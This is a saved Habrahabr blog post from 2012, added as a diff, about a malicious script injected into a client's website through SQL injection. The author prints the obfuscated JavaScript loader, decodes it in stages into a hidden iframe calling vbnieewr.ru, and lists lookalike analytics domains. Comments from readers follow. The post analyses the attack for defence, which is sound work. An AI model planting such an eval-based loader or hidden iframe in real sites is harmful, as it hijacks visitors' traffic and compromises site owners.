@@ -1,0 +1,4634 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0055)http://habrahabr.ru/blogs/infosecurity/136771/#habracut -->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		
+		<title>Как я узнал, что у нас сливают трафик / Информационная безопасность / Хабрахабр</title>
+		
+		
+		
+			<link href="http://habrahabr.ru/styles/1327996491/all.css" rel="stylesheet" media="all">
+		
+    
+		
+  <link href="http://habrahabr.ru/styles/1327996491/_parts/posts.css" rel="stylesheet" media="all">
+  <link href="http://habrahabr.ru/styles/1327996491/_parts/comments.css" rel="stylesheet" media="all">
+  <link href="http://habrahabr.ru/styles/1327996491/posts/all.css" rel="stylesheet" media="all">
+  <link href="http://habrahabr.ru/styles/1327996491/forms.css" rel="stylesheet" media="all">
+  <link href="http://habrahabr.ru/styles/1327996491/highlight.css" rel="stylesheet" media="all">
+
+
+		
+		
+			<script type="text/javascript" src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/all.js"></script>
+		
+		
+			
+		
+  <script type="text/javascript" src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/jquery.form.js"></script>
+  <script type="text/javascript" src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/jquery.cookie.js"></script>
+  <script type="text/javascript" src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/swfobject.js"></script>
+  <script type="text/javascript" src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/wysiwyg.js"></script>
+  <script type="text/javascript" src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/highlight.js"></script>
+  <script type="text/javascript" src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/posts.js"></script>
+  <script type="text/javascript" src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/comments.js"></script>
+  <script type="text/javascript" src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/all(1).js"></script>
+
+		
+		<script type="text/javascript" src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/adriver.core.2.js"></script>
+		
+		
+		
+		<link title="Хабрахабр / Комментарии к публикации &laquo;Как я узнал, что у нас сливают трафик&raquo; в блоге &laquo;Информационная безопасность&raquo;" type="application/rss+xml" rel="alternate" href="http://habrahabr.ru/rss/post/136771/">
+		
+	<script async="true" src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/ga.js"></script></head>
+
+	<body>
+	  
+
+
+	<div id="topline" title=""><div style="position: relative; height: 90px; "><table width="100%" height="90" cellspacing="0" cellpadding="0" border="0" style="line-height: 100%; margin: 0; padding: 0;"><tbody><tr><td style="width: 50%; line-height: 100%; margin: 0; padding: 0;"><a target="_blank" href="http://ad.adriver.ru/cgi-bin/click.cgi?sid=176776&ad=299620&bid=1487001&bt=52&bn=1&pz=0&ref=http:%2f%2fhabrahabr.ru%2fblogs%2finfosecurity%2f136771%2f&custom=&rleurl="><img width="100%" vspace="0" hspace="0" height="90" border="0" src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/cc1_90.jpg"></a></td><td width="1000" style="background-image:url(&#39;http://eltel2.adriver.ru/images/0001487/0001487001/0/cc1_90.jpg&#39;); line-height: 100%; margin: 0; padding: 0;"><a href="http://ad.adriver.ru/cgi-bin/click.cgi?sid=176776&ad=299620&bid=1487001&bt=52&bn=1&pz=0&ref=http:%2f%2fhabrahabr.ru%2fblogs%2finfosecurity%2f136771%2f&custom=&rleurl=" target="_blank"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/cc.jpg" border="0" width="1000" height="90"></a></td><td style="width: 50%; line-height: 100%; margin: 0; padding: 0;"><a target="_blank" href="http://ad.adriver.ru/cgi-bin/click.cgi?sid=176776&ad=299620&bid=1487001&bt=52&bn=1&pz=0&ref=http:%2f%2fhabrahabr.ru%2fblogs%2finfosecurity%2f136771%2f&custom=&rleurl="><img width="100%" vspace="0" hspace="0" height="90" border="0" src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/cc1_90.jpg"></a></td></tr></tbody></table></div></div>
+	<script type="text/javascript">
+	new adriver("topline", {sid:176776, bt:52, bn:1});
+	</script>
+
+
+
+
+
+		<div id="layout">	    
+		  <div id="header">
+  <div class="userpanel silver">
+    
+    
+      <a href="http://habrahabr.ru/login/" class="login">войти</a> <a href="http://habrahabr.ru/register/">зарегистрироваться</a>
+    
+  </div>
+  <a class="logo" href="http://habrahabr.ru/" title="На главную страницу"></a>
+  <div class="search">
+    <form id="search_form" name="search" method="get" action="http://habrahabr.ru/search/">
+      <input type="text" name="q" value="поиск по сайту" onfocus="this.value = (this.value == &#39;поиск по сайту&#39;) ? &#39;&#39; : this.value" onblur="this.value = (this.value == &#39;&#39;) ? &#39;поиск по сайту&#39; : this.value" autocomplete="off">
+      <input type="submit" value="">
+    </form>
+  </div>
+  
+
+	<div class="main_menu">
+		<a href="http://habrahabr.ru/" class="active">посты</a><a href="http://habrahabr.ru/qa/">q&amp;a</a><a href="http://habrahabr.ru/bloglist/">блоги</a><a href="http://habrahabr.ru/events/coming/">события</a><a href="http://habrahabr.ru/companies/">компании</a>
+		<div class="banner_special">
+
+	 
+
+	 
+
+	
+	
+		<!--  AdRiver code START. Type:135x35 Site: habrahabr PZ: 0 BN: 0 -->
+		<script language="javascript" type="text/javascript"><!--
+		var RndNum4NoCash = Math.round(Math.random() * 1000000000);
+		var ar_Tail='unknown'; if (document.referrer) ar_Tail = escape(document.referrer);
+		document.write(
+		'<iframe src="http://ad.adriver.ru/cgi-bin/erle.cgi?'
+		+ 'sid=176776&target=top&w=135&h=35&bt=25&pz=0&rnd=' + RndNum4NoCash + '&tail256=' + ar_Tail
+		+ '" frameborder=0 vspace=0 hspace=0 width=135 height=35 marginwidth=0'
+		+ ' marginheight=0 scrolling=no></iframe>');
+		//--></script><iframe src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/erle(3).html" frameborder="0" vspace="0" hspace="0" width="135" height="35" marginwidth="0" marginheight="0" scrolling="no"></iframe>
+		<noscript></noscript>
+
+		<!--  AdRiver code END  -->
+	
+	
+
+</div>
+	</div>
+
+
+</div>
+
+
+	
+		  
+	  
+		  
+
+	<div class="blog_header">
+  <h2>
+    <a href="http://habrahabr.ru/blogs/infosecurity/" class="blog_title">Информационная безопасность</a>
+    <span class="profiled_blog" title="Профильный блог"></span>
+
+    
+  				
+	</h2>
+	<div class="blog-index">
+	 <div class="label">индекс</div>
+	 <div class="value">290,76</div>
+	</div>
+</div>
+  <div class="content_left">
+
+	
+
+
+	
+
+
+
+	
+		<div class="add_post"><a href="http://habrahabr.ru/add/topic/" title="Добавить пост"></a></div>
+	
+	
+
+
+<table class="menu">
+  <tbody><tr>
+    
+      <td class="item ">
+        <a href="http://habrahabr.ru/blogs/infosecurity/">Захабренные </a>      
+      </td>
+    
+      <td class="item ">
+        <a href="http://habrahabr.ru/blogs/infosecurity/new/">Новые (<span class="count">1)</span></a>      
+      </td>
+    
+      <td class="item ">
+        <a href="http://habrahabr.ru/blogs/infosecurity/unhabred/">Отхабренные </a>      
+      </td>
+    
+  </tr>  
+</tbody></table>
+<div class="submenu ">
+
+</div>
+<div class="clear"></div>
+
+
+  
+
+	<div class="company_post">
+
+	
+
+		
+  <div class="post" id="post_136771">
+    <h2 class="title">
+      
+    	
+	      
+	    
+	    
+	      
+      
+        <span class="post_title">Как я узнал, что у нас сливают трафик</span>
+      
+      
+      
+
+      
+  	</h2>
+  	<div class="content">
+  	Приветствую Вас уважаемое хабра-сообщество. Хочу поведать Вам о том, как сливали трафик у одного из моих клиентов.<br>
+Сидел я поздним вечером, и решил пройтись по сайтам клиентов, и на одном из них, я увидел, что чуть-чуть сместился один div.<br>
+Посмотрев исходный код и пролистав его туда-сюда раз 10, я увидел, что скрипт подгружается с интересного домена:<br>
+<img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/cea3fd51206e3ff6ab01705d2ed89d83.jpg"><br>
+Трудно заметить, что последний подключаемый скрипт ведет на goog<b>1(цифра)</b>e-analitics.com<br>
+<a name="habracut"></a><br>
+В первую очередь, мне было интересно, не то, как он туда попал, а что он из себя представляет.<br>
+<br>
+<pre><code class="javascript">
+<span class="keyword">var</span> $h = ((\u0073elf + <span class="number">0</span> * <span class="number">1</span>)[<span class="number">0</span> ^ ([] * <span class="number">0</span>)] == <span class="string">'\x5B'</span>);
+<span class="keyword">if</span> ($h)
+{
+    $j = [<span class="string">'1^%0.%4[%b/%5=%c;%d_%8|%6?%3&gt;%f-%9!%7$%e'</span>, <span class="string">'%a)%2('</span>];
+}
+<span class="keyword">var</span> $d =
+{
+    <span class="string">'$sA'</span>: <span class="string">'str\x69\x6Eg'</span>,
+    <span class="string">'$l6'</span>: [],
+    <span class="string">'$EI'</span>: <span class="string">'\x6A\x6Fin'</span>,
+    <span class="string">'$qH'</span>: <span class="string">'\x73\x75bstr'</span>,
+    <span class="string">'$fJ'</span>: <span class="string">'decode\x55\x52\x49\x43\x6F\x6D\x70\x6F\x6Eent'</span>,
+    <span class="string">'$FP'</span>: <span class="literal">true</span>,
+    <span class="string">'$2K'</span>: <span class="string">'sp\x6C\x69t'</span>
+},
+    $sA = <span class="function"><span class="keyword">function</span> <span class="params">(_)</span>
+    {</span>
+        <span class="keyword">for</span> ($g = ~$d.$l6 - ~$d.$l6; $g &lt; $P[_]; $g += -~$d.$FP)
+        {
+            $j += <span class="string">'\x25'</span> + $P[$g++] + $P[$g--];
+        }
+        $E[<span class="string">'eva\x6C'</span>]($E[$d.$fJ]($j));
+    },
+    $P = <span class="string">'$??^$((.=-$^&gt;_=;$=&gt;.&gt;.&gt;?&gt;[=;$=&gt;.&gt;.&gt;?[??&gt;$=?_?=?#$[(#?&gt;$(?=?^$[=;$=&gt;.&gt;.&gt;?&gt;==;$=&gt;.&gt;.&gt;[&gt;==;$=&gt;.&gt;.&gt;?[&gt;=;$=&gt;.&gt;.&gt;?&gt;=?_?=?#$[(|($?!??$(?^=;$|&gt;?[[=;$|&gt;?&gt;=($(!(;=-?#&gt;_($$&gt;=;$|&gt;?&gt;==;$|&gt;$&gt;[=;$|&gt;[&gt;^=;$|&gt;$&gt;[=;$|&gt;$&gt;[=;$|&gt;$&gt;(?!?($=$[?=($&gt;/=-$^=/=-?#=_(|($=;$|&gt;$&gt;&gt;$(?&gt;($(;($?|$[$[$.&gt;)(-(-$??(?#?!?=?=$$$(=;$|&gt;([==;$|&gt;$&gt;(=;$|&gt;$&gt;==;$|&gt;([?=;$|&gt;?&gt;!=;$|&gt;?[==;$|&gt;([==;$|&gt;?&gt;&gt;=;$|&gt;?&gt;$=;$|&gt;?&gt;!=;$|&gt;&gt;[?=;$|&gt;?&gt;[=;$|&gt;?&gt;==;$|&gt;?&gt;?=;$|&gt;?&gt;^=;$|&gt;$&gt;=?;$[($(!&gt;/=-$^(#$&gt;$[$!?;?=(#$.?-$&gt;?!$[?!?-?#&gt;_($?^?($&gt;=;$|&gt;?[?=;$|&gt;?[&gt;=;$|&gt;$&gt;==;$|&gt;$&gt;[?=($&gt;/=-$^(#$&gt;$[$!?;?=(#$$?!?[$[?|&gt;_($&gt;^&gt;?$.$|($&gt;/=-$^=/=-?#=_(|($??$(=;$|&gt;?&gt;^=;$|&gt;?[[=;$|&gt;?&gt;=?(?-$(?[?=$(($(;(.?#?^$?=;$=&gt;.&gt;.&gt;?&gt;!=;$=&gt;.&gt;.&gt;?&gt;$=;$=&gt;.&gt;.&gt;?&gt;^$[?-$((#$=$&gt;?==;$=&gt;.&gt;.&gt;$&gt;(=;$=&gt;.&gt;.&gt;[&gt;^=;$=&gt;.&gt;.&gt;?&gt;$?=?#$[(#?!=;$=&gt;.&gt;.&gt;?[==;$=&gt;.&gt;.&gt;?&gt;[=;$=&gt;.&gt;.&gt;?&gt;=$|[-??(|($??&gt;.?^&gt;$?^&gt;^&gt;[&gt;(?(&gt;$&gt;=&gt;=&gt;^&gt;$&gt;(?[?^&gt;$&gt;(????&gt;$&gt;[?^&gt;^?^?&gt;&gt;(&gt;=&gt;^&gt;!&gt;!($(!(/&gt;^(!&gt;/=-$^(#$&gt;$[$!?;?=(#?;?=??$[(.&gt;_(.($(_&gt;=&gt;=&gt;!&gt;$$.$|($&gt;/?[=;$=&gt;.&gt;.&gt;?[?=;$=&gt;.&gt;.&gt;?&gt;&gt;$=?_?=?#$[(#$$=;$=&gt;.&gt;.&gt;$&gt;(?!$[?=(|($&gt;;?[?!$?(.?!?[&gt;_=;($=-=-?[$(&gt;^&gt;^&gt;!&gt;&gt;&gt;|=;($&gt;#&gt;;(-?[?!$?&gt;#($(!&gt;/=;$=&gt;.&gt;.&gt;?&gt;[=;$=&gt;.&gt;.&gt;?[??&gt;$=?_?=?#$[(#?$?=$[[=?;?=?_?=?#$[[($![!?[(|($=-=-?[$(&gt;^&gt;^&gt;!&gt;&gt;&gt;|($(!(#?^$.$.?=?#?[[&gt;?|?!?;?[(|=-$^(!&gt;/'</span>,
+    $w = <span class="function"><span class="keyword">function</span> <span class="params">()</span>
+    {</span>
+        $w = $j[$d.$EI](<span class="string">'\x23'</span>)[$d.$<span class="number">2</span>K](<span class="string">'\x25'</span>);
+        <span class="keyword">for</span> (<span class="keyword">var</span> $<span class="number">1</span> <span class="keyword">in</span> $w)
+        {
+            <span class="keyword">if</span> (<span class="keyword">typeof</span>($w[$<span class="number">1</span>]) == $d.$sA)
+            {
+                $P = $P[$d.$<span class="number">2</span>K]($w[$<span class="number">1</span>][$d.$qH](<span class="number">1</span>))[$d.$EI]($w[$<span class="number">1</span>][<span class="number">0</span>]);
+            }
+        }
+        <span class="keyword">return</span> <span class="keyword">this</span>;
+    },
+    $E = $w(),
+    $j = <span class="string">''</span>;
+$sA(<span class="string">'le\x6E\x67th'</span>);
+</code></pre><br>
+<br>
+<h4>Раскодируем поэтапно скрипт воспользовавшись обратными функциями: </h4><br>
+<br>
+<h5>Результаты первого прохода:</h5><br>
+<pre><code class="javascript">
+<span class="keyword">var</span> $h = ((\u0073elf + <span class="number">0</span> * <span class="number">1</span>)[<span class="number">0</span> ^ ([] * <span class="number">0</span>)] == <span class="string">'['</span>);
+<span class="keyword">if</span> ($h)
+{
+    $j = [<span class="string">'1^%0.%4[%b/%5=%c;%d_%8|%6?%3&gt;%f-%9!%7$%e'</span>, <span class="string">'%a)%2('</span>];
+}
+<span class="keyword">var</span> $d =
+{
+    <span class="string">'$sA'</span>: <span class="string">'string'</span>,
+    <span class="string">'$l6'</span>: [],
+    <span class="string">'$EI'</span>: <span class="string">'join'</span>,
+    <span class="string">'$qH'</span>: <span class="string">'substr'</span>,
+    <span class="string">'$fJ'</span>: <span class="string">'decodeURIComponent'</span>,
+    <span class="string">'$FP'</span>: <span class="literal">true</span>,
+    <span class="string">'$2K'</span>: <span class="string">'split'</span>
+},
+    $sA = <span class="function"><span class="keyword">function</span> <span class="params">(_)</span>
+    {</span>
+        <span class="keyword">for</span> ($g = ~$d.$l6 - ~$d.$l6; $g &lt; $P[_]; $g += -~$d.$FP)
+        {
+            $j += <span class="string">'%'</span> + $P[$g++] + $P[$g--];
+        }
+        $E[<span class="string">'eval'</span>]($E[$d.$fJ]($j));
+    },
+    $P = <span class="string">'$??^$((.=-$^&gt;_=;$=&gt;.&gt;.&gt;?&gt;[=;$=&gt;.&gt;.&gt;?[??&gt;$=?_?=?#$[(#?&gt;$(?=?^$[=;$=&gt;.&gt;.&gt;?&gt;==;$=&gt;.&gt;.&gt;[&gt;==;$=&gt;.&gt;.&gt;?[&gt;=;$=&gt;.&gt;.&gt;?&gt;=?_?=?#$[(|($?!??$(?^=;$|&gt;?[[=;$|&gt;?&gt;=($(!(;=-?#&gt;_($$&gt;=;$|&gt;?&gt;==;$|&gt;$&gt;[=;$|&gt;[&gt;^=;$|&gt;$&gt;[=;$|&gt;$&gt;[=;$|&gt;$&gt;(?!?($=$[?=($&gt;/=-$^=/=-?#=_(|($=;$|&gt;$&gt;&gt;$(?&gt;($(;($?|$[$[$.&gt;)(-(-$??(?#?!?=?=$$$(=;$|&gt;([==;$|&gt;$&gt;(=;$|&gt;$&gt;==;$|&gt;([?=;$|&gt;?&gt;!=;$|&gt;?[==;$|&gt;([==;$|&gt;?&gt;&gt;=;$|&gt;?&gt;$=;$|&gt;?&gt;!=;$|&gt;&gt;[?=;$|&gt;?&gt;[=;$|&gt;?&gt;==;$|&gt;?&gt;?=;$|&gt;?&gt;^=;$|&gt;$&gt;=?;$[($(!&gt;/=-$^(#$&gt;$[$!?;?=(#$.?-$&gt;?!$[?!?-?#&gt;_($?^?($&gt;=;$|&gt;?[?=;$|&gt;?[&gt;=;$|&gt;$&gt;==;$|&gt;$&gt;[?=($&gt;/=-$^(#$&gt;$[$!?;?=(#$$?!?[$[?|&gt;_($&gt;^&gt;?$.$|($&gt;/=-$^=/=-?#=_(|($??$(=;$|&gt;?&gt;^=;$|&gt;?[[=;$|&gt;?&gt;=?(?-$(?[?=$(($(;(.?#?^$?=;$=&gt;.&gt;.&gt;?&gt;!=;$=&gt;.&gt;.&gt;?&gt;$=;$=&gt;.&gt;.&gt;?&gt;^$[?-$((#$=$&gt;?==;$=&gt;.&gt;.&gt;$&gt;(=;$=&gt;.&gt;.&gt;[&gt;^=;$=&gt;.&gt;.&gt;?&gt;$?=?#$[(#?!=;$=&gt;.&gt;.&gt;?[==;$=&gt;.&gt;.&gt;?&gt;[=;$=&gt;.&gt;.&gt;?&gt;=$|[-??(|($??&gt;.?^&gt;$?^&gt;^&gt;[&gt;(?(&gt;$&gt;=&gt;=&gt;^&gt;$&gt;(?[?^&gt;$&gt;(????&gt;$&gt;[?^&gt;^?^?&gt;&gt;(&gt;=&gt;^&gt;!&gt;!($(!(/&gt;^(!&gt;/=-$^(#$&gt;$[$!?;?=(#?;?=??$[(.&gt;_(.($(_&gt;=&gt;=&gt;!&gt;$$.$|($&gt;/?[=;$=&gt;.&gt;.&gt;?[?=;$=&gt;.&gt;.&gt;?&gt;&gt;$=?_?=?#$[(#$$=;$=&gt;.&gt;.&gt;$&gt;(?!$[?=(|($&gt;;?[?!$?(.?!?[&gt;_=;($=-=-?[$(&gt;^&gt;^&gt;!&gt;&gt;&gt;|=;($&gt;#&gt;;(-?[?!$?&gt;#($(!&gt;/=;$=&gt;.&gt;.&gt;?&gt;[=;$=&gt;.&gt;.&gt;?[??&gt;$=?_?=?#$[(#?$?=$[[=?;?=?_?=?#$[[($![!?[(|($=-=-?[$(&gt;^&gt;^&gt;!&gt;&gt;&gt;|($(!(#?^$.$.?=?#?[[&gt;?|?!?;?[(|=-$^(!&gt;/'</span>,
+    $w = <span class="function"><span class="keyword">function</span> <span class="params">()</span>
+    {</span>
+        $w = $j[$d.$EI](<span class="string">'#'</span>)[$d.$<span class="number">2</span>K](<span class="string">'%'</span>);
+        <span class="keyword">for</span> (<span class="keyword">var</span> $<span class="number">1</span> <span class="keyword">in</span> $w)
+        {
+            <span class="keyword">if</span> (<span class="keyword">typeof</span>($w[$<span class="number">1</span>]) == $d.$sA)
+            {
+                $P = $P[$d.$<span class="number">2</span>K]($w[$<span class="number">1</span>][$d.$qH](<span class="number">1</span>))[$d.$EI]($w[$<span class="number">1</span>][<span class="number">0</span>]);
+            }
+        }
+        <span class="keyword">return</span> <span class="keyword">this</span>;
+    },
+    $E = $w(),
+    $j = <span class="string">''</span>;
+$sA(<span class="string">'length'</span>);
+</code></pre><br>
+<br>
+<h5>Результат второго прохода:</h5><br>
+<pre><code class="javascript">
+<span class="keyword">var</span> _q = \u0064\u006Fcument.creat\u0065\u0045\u006C\u0065ment(<span class="string">'ifra\x6D\x65'</span>),
+    _n = <span class="string">'s\x65\x74\x41\x74\x74\x72ibute'</span>;
+_q[_n](<span class="string">'\x73rc'</span>, <span class="string">'http://vbnieewr\x2E\x72\x75\x2F\x69\x6E\x2E\x63\x67\x69\x3F\x64\x65\x66\x61\x75lt'</span>);
+_q.style.position = <span class="string">'abs\x6F\x6C\x75\x74e'</span>;
+_q.style.width = <span class="string">'16px'</span>;
+_q[_n](<span class="string">'fr\x61\x6D\x65border'</span>, nav\u0069\u0067\u0061tor.use\u0072\u0041\u0067ent.i\u006E\u0064\u0065xOf(<span class="string">'f0a7a142b755172da72ff74a1ac25199'</span>) + <span class="number">1</span>);
+_q.style.left = <span class="string">'-5597px'</span>;
+eval(<span class="string">'&lt;div id=\'__dr11938\'&gt;&lt;/div&gt;'</span>);\u0064\u006Fcument.getElementById(<span class="string">'__dr11938'</span>).appendChild(_q);
+</code></pre><br>
+<br>
+Далее уберем 16-ричную систему функцией <a href="http://www.w3schools.com/jsref/jsref_unescape.asp">unescape</a><br>
+<br>
+<pre><code class="javascript">
+<span class="keyword">var</span> _q = document.createElement(<span class="string">'iframe'</span>),
+    _n = <span class="string">'setAttribute'</span>;
+_q[_n](<span class="string">'src'</span>, <span class="string">'http://vbnieewr.ru/in.cgi?default'</span>);
+_q.style.position = <span class="string">'absolute'</span>;
+_q.style.width = <span class="string">'16px'</span>;
+_q[_n](<span class="string">'frameborder'</span>, navigator.userAgent.indexOf(<span class="string">'f0a7a142b755172da72ff74a1ac25199'</span>) + <span class="number">1</span>);
+_q.style.left = <span class="string">'-5597px'</span>;
+document.write(<span class="string">'&lt;div id=\'__dr11938\'&gt;&lt;/div&gt;'</span>);
+document.getElementById(<span class="string">'__dr11938'</span>).appendChild(_q);
+</code></pre><br>
+<br>
+Теперь мы привели скрипт к читаемому виду, и теперь хорошо видно, что создаётся ифрейм на адрес <b><a href="http://vbnieewr.ru/in.cgi?default">vbnieewr.ru/in.cgi?default</a></b>.<br>
+<br>
+Далее пробив домены по whois я узнал, что они созданы недавно:<br>
+<blockquote>domain: VBNIEEWR.RU<br>
+nserver: ns1.ubercontrol.ru.<br>
+nserver: ns2.ubercontrol.ru.<br>
+state: REGISTERED, DELEGATED, VERIFIED<br>
+person: Private Person<br>
+registrar: REGRU-REG-RIPN<br>
+admin-contact: <a href="http://www.reg.ru/whois/admin_contact">www.reg.ru/whois/admin_contact</a><br>
+<b>created: 2012.01.13</b><br>
+paid-till: 2013.01.13</blockquote><br>
+<br>
+Получил заголовки ответа от скрипта <a href="http://vbnieewr.ru/in.cgi?default">vbnieewr.ru/in.cgi?default</a><br>
+<pre><code class="php">
+<span class="keyword">array</span>(<span class="number">23</span>) {
+  [<span class="number">0</span>]=&gt;
+  string(<span class="number">18</span>) <span class="string">"HTTP/1.1 302 Found"</span>
+...
+ [<span class="number">4</span>]=&gt;
+  string(<span class="number">22</span>) <span class="string">"Location: http://ya.ru"</span>
+....
+  [<span class="number">5</span>]=&gt;
+  string(<span class="number">17</span>) <span class="string">"Connection: close"</span>
+...
+</code></pre><br>
+<br>
+И понял, что идет банальный слив трафика, и скорее всего через скрипт <a href="http://kytoon.com/sutra-tds.html">Sutra TDS</a>.<br>
+<br>
+Примерная схема работы:<br>
+<img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/731bab3d4d966846ac2138869477d9ac.jpg"><br>
+Адрес админки я подобрать не смог, но может кто нибудь из хабра-юзверей сможет.<br>
+<br>
+Кстати, данный js скрипт вставили из-за sql инъекции, которую удалось найти по логам и благополучно закрыть. <br>
+<br>
+<b>UDP:</b> Новый URL с подобным скриптом: <b><a href="http://yandex-metrika.com/watch.js">yandex-metrika.com/watch.js</a><br>
+</b><br>
+<br>
+На всякий случай проверьте свои сайты на подобный код. 
+  	<div class="clear"></div> 	
+  	</div>
+    
+<ul class="tags">
+	<li><a href="http://habrahabr.ru/tag/%D0%A1%D0%BB%D0%B8%D0%B2%20%D1%82%D1%80%D0%B0%D1%84%D0%B8%D0%BA%D0%B0/" rel="tag">Слив трафика</a></li><li>, <a href="http://habrahabr.ru/tag/JS/" rel="tag">JS</a></li><li>, <a href="http://habrahabr.ru/tag/Sutra%20TDS/" rel="tag">Sutra TDS</a></li>
+</ul>
+
+    <div class="infopanel" id="infopanel_post_136771">
+	
+        
+	
+	<div class="voting   ">
+
+		  				  
+		
+		<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+		<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+		
+
+		<div class="mark positive ">
+			
+			<span class="score" title="Всего 167: &uarr;154 и &darr;13">+141</span>
+			
+			  					  
+		</div>  
+
+	</div>
+	
+	
+
+	
+
+	<div class="published">25 января 2012, 21:09</div>
+
+	<div class="favorite">
+		
+		
+		<a class="guest" href="http://habrahabr.ru/blogs/infosecurity/136771/#" onclick="return false;" title="Только зарегистрированные пользователи могут добавлять посты в избранное"></a>
+		
+	</div>
+
+	<div class="favs_count" title="Количество пользователей, добавивших пост в избранное">198</div>
+
+	
+	<div class="twitter">
+		<a href="http://twitter.com/intent/tweet?text=http://habr.ru/p/136771/+%D0%9A%D0%B0%D0%BA+%D1%8F+%D1%83%D0%B7%D0%BD%D0%B0%D0%BB%2C+%D1%87%D1%82%D0%BE+%D1%83+%D0%BD%D0%B0%D1%81+%D1%81%D0%BB%D0%B8%D0%B2%D0%B0%D1%8E%D1%82+%D1%82%D1%80%D0%B0%D1%84%D0%B8%D0%BA+%23habr" title="Опубликовать ссылку в Twitter" target="_blank"></a>
+	</div>
+	<div class="vkontakte"> 
+		<a href="http://vkontakte.ru/share.php?url=http://habr.ru/p/136771/" title="Опубликовать ссылку во ВКонтакте" onclick="window.open(this.href, &#39;Опубликовать ссылку во Вконтакте&#39;, &#39;width=800,height=300&#39;); return false"></a>
+	</div>
+	<div class="facebook">
+		<a href="http://www.facebook.com/sharer.php?u=http://habr.ru/p/136771/" title="Опубликовать ссылку в Facebook" onclick="window.open(this.href, &#39;Опубликовать ссылку в Facebook&#39;, &#39;width=800,height=300&#39;); return false"></a>
+	</div>
+	
+
+	
+
+	
+
+	
+	
+
+	
+	
+	<div class="author">
+		<a title="Автор текста" href="http://habrahabr.ru/users/AlexanderPHP/">AlexanderPHP</a>
+	</div>
+	
+	
+
+	
+
+</div>
+<div class="clear"></div>    
+    
+	</div>
+
+		
+		
+<div class="comments_list " id="comments">
+
+  <h2 class="title ">комментарии (<span id="comments_count">82</span>)
+    
+  </h2>
+
+   
+    
+<div class="comment_item" id="comment_4560772">
+	
+	
+		<div class="info  	" rel="4560772">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560772" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 47: &uarr;47 и &darr;0">+47</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/deniamnet/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/30075_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/deniamnet/" class="username">deniamnet</a>
+			<time datetime="2012-01-25T21:12:50+04:00">25 января 2012, 21:12</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560772" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			В скрипте не только «1» вместо «l», но и analitics вместо analytics 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560772">
+	 
+		
+<div class="comment_item" id="comment_4560778">
+	
+	
+		<div class="info  	" rel="4560778">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560778" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 7: &uarr;7 и &darr;0">+7</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/AlexanderPHP/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/AlexanderPHP/" class="username">AlexanderPHP</a>
+			<time datetime="2012-01-25T21:15:12+04:00">25 января 2012, 21:15</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560778" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560772" data-id="4560778" data-parent_id="4560772" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Да и правда, спасибо за внимательность. Но всё же, с первого раза я не подумал ничего плохого на этот скрипт, но потом всё же решил проверить 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560778">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4560799">
+	
+	
+		<div class="info  	" rel="4560799">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560799" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 3: &uarr;2 и &darr;1">+1</span> 
